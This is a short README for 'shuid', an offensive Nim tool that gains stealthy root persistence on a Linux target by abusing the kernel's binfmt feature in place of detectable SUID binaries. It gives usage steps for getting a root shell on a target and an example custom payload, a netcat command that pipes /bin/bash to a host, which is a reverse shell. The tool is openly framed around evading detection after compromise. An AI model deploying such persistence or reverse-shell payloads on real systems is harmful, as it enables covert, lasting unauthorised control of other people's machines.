<div align=center>
<img src=./icon.png>
<pre><code><strong>Privileged persistence 
<br>without using noisy and detectable SUID 
<br>using <i>binfmt</i> Kernel feature instead</strong>
Also a good way to learn Nim and something new
</code></pre>
</div>

## Like at home! 🏡 <sup>(persistence)</sup>

* First transfer `shuid` on target
* Run it!<br><pre><code>./shuid</code></pre>

And that's all, **root shell** is obtained and process to obtain it again will be outputted 


##### More granular

You can choose which SUID will trigger your payload (`-c`). And, obviously, you can also custom the payload (`--payload`).
An example:
```shell
./shuid -c --payload "nc 127.0.0.2 -e /bin/bash"
```


## [Understand the trick](TRICK.md)


<div align=center>
<sup>
All credits goes to <a href= https://github.com/Sentinel-One/shadowsuid/>Dor Dankner</a>, <a href= https://github.com/toffan/binfmt_misc>toffan</a> and <a href= https://www.hackthebox.com/home/users/profile/590762>uco2KFH</a> 
</sup>
</div>
